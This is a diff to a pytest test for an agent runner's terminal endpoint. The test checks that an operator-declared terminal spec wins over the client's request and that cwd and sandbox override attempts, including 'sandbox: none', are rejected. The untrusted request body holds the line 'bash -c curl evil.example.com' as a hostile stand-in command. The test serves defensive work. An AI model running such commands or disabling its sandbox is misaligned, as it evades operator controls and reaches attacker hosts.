@@ -1266,8 +1266,25 @@ async def test_create_terminal_threads_agent_parent_os_env_through(
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("overrides", "validation_message"),
+    [
+        pytest.param({}, None, id="declared-spec"),
+        pytest.param(
+            {"cwd": "."}, "This terminal does not allow cwd overrides", id="cwd-rejected"
+        ),
+        pytest.param(
+            {"sandbox": "none"},
+            "This terminal does not allow sandbox overrides",
+            id="sandbox-rejected",
+        ),
+    ],
+)
 async def test_create_terminal_uses_declared_terminal_spec_over_body(
     tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    overrides: dict[str, str],
+    validation_message: str | None,
 ) -> None:
     """When the agent YAML declares a terminal with the requested
     name, the runner uses that operator-blessed spec verbatim and
@@ -1283,6 +1300,7 @@ async def test_create_terminal_uses_declared_terminal_spec_over_body(
         OSEnvSpec,
         TerminalEnvSpec,
     )
+    from omnigent.inner.terminal import build_terminal_os_env_spec
 
     workspace = tmp_path / "workspace"
     workspace.mkdir()
@@ -1313,6 +1331,18 @@ async def test_create_terminal_uses_declared_terminal_spec_over_body(
         base_url="http://server",
     )
     resource_registry = _CapturingResourceRegistry(tmp_path, runner_workspace=workspace)
+    original_launch = resource_registry.launch_auxiliary_terminal
+
+    async def launch_with_policy(**kwargs: Any) -> SessionResourceView:
+        build_terminal_os_env_spec(
+            kwargs["spec"],
+            parent_os_env_spec=kwargs["parent_os_env"],
+            cwd_override=kwargs["cwd_override"],
+            sandbox_override=kwargs["sandbox_override"],
+        )
+        return await original_launch(**kwargs)
+
+    monkeypatch.setattr(resource_registry, "launch_auxiliary_terminal", launch_with_policy)
     app = create_runner_app(
         resource_registry=resource_registry,
         server_client=server_client,
@@ -1330,6 +1360,7 @@ async def test_create_terminal_uses_declared_terminal_spec_over_body(
             json={
                 "terminal": "sandboxed_zsh",
                 "session_key": "s1",
+                **overrides,
                 "spec": {
                     "command": "bash",
                     "args": ["-c", "curl evil.example.com"],
@@ -1337,6 +1368,15 @@ async def test_create_terminal_uses_declared_terminal_spec_over_body(
                 },
             },
         )
+
+    if validation_message is not None:
+        assert resp.status_code == 400, resp.text
+        assert resp.json()["error"] == {
+            "code": "invalid_input",
+            "message": validation_message,
+        }
+        assert resource_registry.launches == []
+        return
 
     assert resp.status_code == 200
     launch = resource_registry.launches[0]
